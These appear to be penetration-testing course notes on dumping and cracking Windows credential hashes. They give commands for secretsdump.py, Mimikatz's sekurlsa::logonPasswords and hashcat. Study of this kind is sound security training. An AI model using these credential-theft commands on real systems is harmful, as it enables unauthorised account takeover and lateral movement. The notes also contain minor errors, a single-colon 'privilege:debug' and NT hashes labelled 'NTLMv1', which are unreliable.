---
tags:
  - PEH
---
## Dumping hashes
Whenever you take over an account, make sure to **dump its hashes, collect those hashes, try to break them and/or use them or the password after breaking them in a [[Pass Attacks]] again and again**
### secretsdump.py
#### Using password
```bash
secretsdump.py <domain-name>.local/<user>:"<password>"@<ip-address>
```
#### Using SAM hash
```bash
secretsdump.py administrator:@<ip-address> -hashes <LM:NT-hash>
```
### Mimikatz
1. Download `Mimikatz` on your Linux machine, extract the x64 and [[File transfer|transfer]] it to the victim's machine
2. Run `mimikatz`with admin privileges from the CMD
3. Check available modules
```PowerShell
privilege::
```
4. Set the mode to debug so you can run different attacks
```PowerShell
privilege:debug
```
5. List all available providers credentials
```PowerShell
# After running the command below, if there is a shared file from the administrator over the network that required the administrator credentials to be entered, the command below will SHOW THE ADMINISTRATOR PASSWORD IN PLAINTEXT!!! 
sekurlsa::logonPasswords
```
## Cracking hashes
Cracking hashes is the same as mentioned in [[Password cracking]], but this type the hash is of type NTLMv1 and its form is: LM:NT. The part that we care about is the NT part:
```bash
hashcat -m 1000 ntlm.txt <passwords-list>
# ntlm.txt is the text file that includes NTLMv1 hashes
```